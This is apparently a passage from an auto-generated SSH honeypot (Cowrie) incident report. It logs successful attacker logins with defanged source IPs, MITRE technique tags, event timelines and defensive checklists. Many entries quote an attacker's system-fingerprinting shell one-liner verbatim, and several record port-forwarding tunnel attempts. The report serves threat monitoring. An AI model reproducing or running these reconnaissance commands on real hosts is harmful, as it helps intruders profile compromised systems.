- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd79af9b22de

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:05 |
| **Last Seen** | 2026-07-09 20:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:05:49` | `cowrie.session.connect` |
| `2026-07-09 20:05:49` | `cowrie.client.version` |
| `2026-07-09 20:05:49` | `cowrie.client.kex` |
| `2026-07-09 20:05:50` | `cowrie.login.success` |
| `2026-07-09 20:05:51` | `cowrie.session.params` |
| `2026-07-09 20:05:51` | `cowrie.command.input` |
| `2026-07-09 20:05:51` | `cowrie.command.input` |
| `2026-07-09 20:05:51` | `cowrie.command.input` |
| `2026-07-09 20:05:51` | `cowrie.command.input` |
| `2026-07-09 20:05:51` | `cowrie.command.input` |
| `2026-07-09 20:05:51` | `cowrie.command.success` |
| `2026-07-09 20:05:51` | `cowrie.command.input` |
| `2026-07-09 20:05:51` | `cowrie.command.input` |
| `2026-07-09 20:05:51` | `cowrie.command.input` |
| `2026-07-09 20:05:51` | `cowrie.command.input` |
| `2026-07-09 20:05:51` | `cowrie.log.closed` |
| `2026-07-09 20:05:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c94a55e93bf5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:07 |
| **Last Seen** | 2026-07-09 20:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:07:07` | `cowrie.session.connect` |
| `2026-07-09 20:07:07` | `cowrie.client.version` |
| `2026-07-09 20:07:07` | `cowrie.client.kex` |
| `2026-07-09 20:07:08` | `cowrie.login.success` |
| `2026-07-09 20:07:09` | `cowrie.session.params` |
| `2026-07-09 20:07:09` | `cowrie.command.input` |
| `2026-07-09 20:07:09` | `cowrie.command.input` |
| `2026-07-09 20:07:09` | `cowrie.command.input` |
| `2026-07-09 20:07:09` | `cowrie.command.input` |
| `2026-07-09 20:07:09` | `cowrie.command.input` |
| `2026-07-09 20:07:09` | `cowrie.command.success` |
| `2026-07-09 20:07:09` | `cowrie.command.input` |
| `2026-07-09 20:07:09` | `cowrie.command.input` |
| `2026-07-09 20:07:09` | `cowrie.command.input` |
| `2026-07-09 20:07:09` | `cowrie.command.input` |
| `2026-07-09 20:07:09` | `cowrie.log.closed` |
| `2026-07-09 20:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef1bcc94f6bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:08 |
| **Last Seen** | 2026-07-09 20:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:08:25` | `cowrie.session.connect` |
| `2026-07-09 20:08:25` | `cowrie.client.version` |
| `2026-07-09 20:08:25` | `cowrie.client.kex` |
| `2026-07-09 20:08:26` | `cowrie.login.success` |
| `2026-07-09 20:08:26` | `cowrie.session.params` |
| `2026-07-09 20:08:26` | `cowrie.command.input` |
| `2026-07-09 20:08:26` | `cowrie.command.input` |
| `2026-07-09 20:08:26` | `cowrie.command.input` |
| `2026-07-09 20:08:26` | `cowrie.command.input` |
| `2026-07-09 20:08:26` | `cowrie.command.input` |
| `2026-07-09 20:08:26` | `cowrie.command.success` |
| `2026-07-09 20:08:26` | `cowrie.command.input` |
| `2026-07-09 20:08:26` | `cowrie.command.input` |
| `2026-07-09 20:08:26` | `cowrie.command.input` |
| `2026-07-09 20:08:26` | `cowrie.command.input` |
| `2026-07-09 20:08:27` | `cowrie.log.closed` |
| `2026-07-09 20:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c647698dc9b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 20:09 |
| **Last Seen** | 2026-07-09 20:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:09:09` | `cowrie.session.connect` |
| `2026-07-09 20:09:09` | `cowrie.client.version` |
| `2026-07-09 20:09:09` | `cowrie.client.kex` |
| `2026-07-09 20:09:09` | `cowrie.login.success` |
| `2026-07-09 20:09:10` | `cowrie.session.params` |
| `2026-07-09 20:09:10` | `cowrie.command.input` |
| `2026-07-09 20:09:10` | `cowrie.log.closed` |
| `2026-07-09 20:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b527ab4e5a7f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:09 |
| **Last Seen** | 2026-07-09 20:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:09:43` | `cowrie.session.connect` |
| `2026-07-09 20:09:43` | `cowrie.client.version` |
| `2026-07-09 20:09:43` | `cowrie.client.kex` |
| `2026-07-09 20:09:44` | `cowrie.login.success` |
| `2026-07-09 20:09:45` | `cowrie.session.params` |
| `2026-07-09 20:09:45` | `cowrie.command.input` |
| `2026-07-09 20:09:45` | `cowrie.command.input` |
| `2026-07-09 20:09:45` | `cowrie.command.input` |
| `2026-07-09 20:09:45` | `cowrie.command.input` |
| `2026-07-09 20:09:45` | `cowrie.command.input` |
| `2026-07-09 20:09:45` | `cowrie.command.success` |
| `2026-07-09 20:09:45` | `cowrie.command.input` |
| `2026-07-09 20:09:45` | `cowrie.command.input` |
| `2026-07-09 20:09:45` | `cowrie.command.input` |
| `2026-07-09 20:09:45` | `cowrie.command.input` |
| `2026-07-09 20:09:45` | `cowrie.log.closed` |
| `2026-07-09 20:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b041642cb0c6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]41` |
| **First Seen** | 2026-07-09 20:09 |
| **Last Seen** | 2026-07-09 20:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:09:59` | `cowrie.session.connect` |
| `2026-07-09 20:10:00` | `cowrie.login.success` |
| `2026-07-09 20:10:00` | `cowrie.session.params` |
| `2026-07-09 20:10:01` | `cowrie.command.input` |
| `2026-07-09 20:10:02` | `cowrie.command.input` |
| `2026-07-09 20:10:02` | `cowrie.command.input` |
| `2026-07-09 20:10:03` | `cowrie.command.input` |
| `2026-07-09 20:10:03` | `cowrie.command.failed` |
| `2026-07-09 20:10:03` | `cowrie.log.closed` |
| `2026-07-09 20:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]41` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d0e3ad6c633

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:11 |
| **Last Seen** | 2026-07-09 20:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:11:00` | `cowrie.session.connect` |
| `2026-07-09 20:11:00` | `cowrie.client.version` |
| `2026-07-09 20:11:00` | `cowrie.client.kex` |
| `2026-07-09 20:11:01` | `cowrie.login.success` |
| `2026-07-09 20:11:02` | `cowrie.session.params` |
| `2026-07-09 20:11:02` | `cowrie.command.input` |
| `2026-07-09 20:11:02` | `cowrie.command.input` |
| `2026-07-09 20:11:02` | `cowrie.command.input` |
| `2026-07-09 20:11:02` | `cowrie.command.input` |
| `2026-07-09 20:11:02` | `cowrie.command.input` |
| `2026-07-09 20:11:02` | `cowrie.command.success` |
| `2026-07-09 20:11:02` | `cowrie.command.input` |
| `2026-07-09 20:11:02` | `cowrie.command.input` |
| `2026-07-09 20:11:02` | `cowrie.command.input` |
| `2026-07-09 20:11:02` | `cowrie.command.input` |
| `2026-07-09 20:11:02` | `cowrie.log.closed` |
| `2026-07-09 20:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8c287a9c80

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:12 |
| **Last Seen** | 2026-07-09 20:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:12:17` | `cowrie.session.connect` |
| `2026-07-09 20:12:18` | `cowrie.client.version` |
| `2026-07-09 20:12:18` | `cowrie.client.kex` |
| `2026-07-09 20:12:18` | `cowrie.login.success` |
| `2026-07-09 20:12:19` | `cowrie.session.params` |
| `2026-07-09 20:12:19` | `cowrie.command.input` |
| `2026-07-09 20:12:19` | `cowrie.command.input` |
| `2026-07-09 20:12:19` | `cowrie.command.input` |
| `2026-07-09 20:12:19` | `cowrie.command.input` |
| `2026-07-09 20:12:19` | `cowrie.command.input` |
| `2026-07-09 20:12:19` | `cowrie.command.success` |
| `2026-07-09 20:12:19` | `cowrie.command.input` |
| `2026-07-09 20:12:19` | `cowrie.command.input` |
| `2026-07-09 20:12:19` | `cowrie.command.input` |
| `2026-07-09 20:12:19` | `cowrie.command.input` |
| `2026-07-09 20:12:20` | `cowrie.log.closed` |
| `2026-07-09 20:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b84ad2e6656

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-09 20:13 |
| **Last Seen** | 2026-07-09 20:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:13:38` | `cowrie.session.connect` |
| `2026-07-09 20:13:38` | `cowrie.client.version` |
| `2026-07-09 20:13:38` | `cowrie.client.kex` |
| `2026-07-09 20:13:38` | `cowrie.login.success` |
| `2026-07-09 20:13:38` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:13:38` | `cowrie.direct-tcpip.ja4` |
| `2026-07-09 20:13:38` | `cowrie.direct-tcpip.data` |
| `2026-07-09 20:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4be21e1084fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:13 |
| **Last Seen** | 2026-07-09 20:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:13:40` | `cowrie.session.connect` |
| `2026-07-09 20:13:40` | `cowrie.client.version` |
| `2026-07-09 20:13:40` | `cowrie.client.kex` |
| `2026-07-09 20:13:41` | `cowrie.login.success` |
| `2026-07-09 20:13:43` | `cowrie.session.params` |
| `2026-07-09 20:13:43` | `cowrie.command.input` |
| `2026-07-09 20:13:43` | `cowrie.command.input` |
| `2026-07-09 20:13:43` | `cowrie.command.input` |
| `2026-07-09 20:13:43` | `cowrie.command.input` |
| `2026-07-09 20:13:43` | `cowrie.command.input` |
| `2026-07-09 20:13:43` | `cowrie.command.success` |
| `2026-07-09 20:13:43` | `cowrie.command.input` |
| `2026-07-09 20:13:43` | `cowrie.command.input` |
| `2026-07-09 20:13:43` | `cowrie.command.input` |
| `2026-07-09 20:13:43` | `cowrie.command.input` |
| `2026-07-09 20:13:43` | `cowrie.log.closed` |
| `2026-07-09 20:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e049b4f1b64f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 20:14 |
| **Last Seen** | 2026-07-09 20:15 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:14:58` | `cowrie.session.connect` |
| `2026-07-09 20:15:00` | `cowrie.client.version` |
| `2026-07-09 20:15:00` | `cowrie.client.kex` |
| `2026-07-09 20:15:06` | `cowrie.login.success` |
| `2026-07-09 20:15:09` | `cowrie.session.params` |
| `2026-07-09 20:15:09` | `cowrie.command.input` |
| `2026-07-09 20:15:11` | `cowrie.log.closed` |
| `2026-07-09 20:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c90179d687d

| Field | Detail |
|---|---|
| **Source IP** | `175.206.1[.]60` |
| **First Seen** | 2026-07-09 20:14 |
| **Last Seen** | 2026-07-09 20:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:14:59` | `cowrie.session.connect` |
| `2026-07-09 20:15:00` | `cowrie.client.version` |
| `2026-07-09 20:15:00` | `cowrie.client.kex` |
| `2026-07-09 20:15:02` | `cowrie.login.success` |
| `2026-07-09 20:15:02` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.1[.]60` to AbuseIPDB if not already reported
- [ ] Block `175.206.1[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e1e2ac4f3fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:15 |
| **Last Seen** | 2026-07-09 20:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:15:02` | `cowrie.session.connect` |
| `2026-07-09 20:15:02` | `cowrie.client.version` |
| `2026-07-09 20:15:02` | `cowrie.client.kex` |
| `2026-07-09 20:15:03` | `cowrie.login.success` |
| `2026-07-09 20:15:04` | `cowrie.session.params` |
| `2026-07-09 20:15:04` | `cowrie.command.input` |
| `2026-07-09 20:15:04` | `cowrie.command.input` |
| `2026-07-09 20:15:04` | `cowrie.command.input` |
| `2026-07-09 20:15:04` | `cowrie.command.input` |
| `2026-07-09 20:15:04` | `cowrie.command.input` |
| `2026-07-09 20:15:04` | `cowrie.command.success` |
| `2026-07-09 20:15:04` | `cowrie.command.input` |
| `2026-07-09 20:15:04` | `cowrie.command.input` |
| `2026-07-09 20:15:04` | `cowrie.command.input` |
| `2026-07-09 20:15:04` | `cowrie.command.input` |
| `2026-07-09 20:15:05` | `cowrie.log.closed` |
| `2026-07-09 20:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3c2aeea4373

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:16 |
| **Last Seen** | 2026-07-09 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:16:25` | `cowrie.session.connect` |
| `2026-07-09 20:16:25` | `cowrie.client.version` |
| `2026-07-09 20:16:25` | `cowrie.client.kex` |
| `2026-07-09 20:16:26` | `cowrie.login.success` |
| `2026-07-09 20:16:27` | `cowrie.session.params` |
| `2026-07-09 20:16:27` | `cowrie.command.input` |
| `2026-07-09 20:16:27` | `cowrie.command.input` |
| `2026-07-09 20:16:27` | `cowrie.command.input` |
| `2026-07-09 20:16:27` | `cowrie.command.input` |
| `2026-07-09 20:16:27` | `cowrie.command.input` |
| `2026-07-09 20:16:27` | `cowrie.command.success` |
| `2026-07-09 20:16:27` | `cowrie.command.input` |
| `2026-07-09 20:16:27` | `cowrie.command.input` |
| `2026-07-09 20:16:27` | `cowrie.command.input` |
| `2026-07-09 20:16:27` | `cowrie.command.input` |
| `2026-07-09 20:16:27` | `cowrie.log.closed` |
| `2026-07-09 20:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65eb078c1019

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-09 20:16 |
| **Last Seen** | 2026-07-09 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:16:39` | `cowrie.session.connect` |
| `2026-07-09 20:16:39` | `cowrie.client.version` |
| `2026-07-09 20:16:39` | `cowrie.client.kex` |
| `2026-07-09 20:16:40` | `cowrie.login.success` |
| `2026-07-09 20:16:40` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:16:40` | `cowrie.direct-tcpip.ja4` |
| `2026-07-09 20:16:40` | `cowrie.direct-tcpip.data` |
| `2026-07-09 20:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

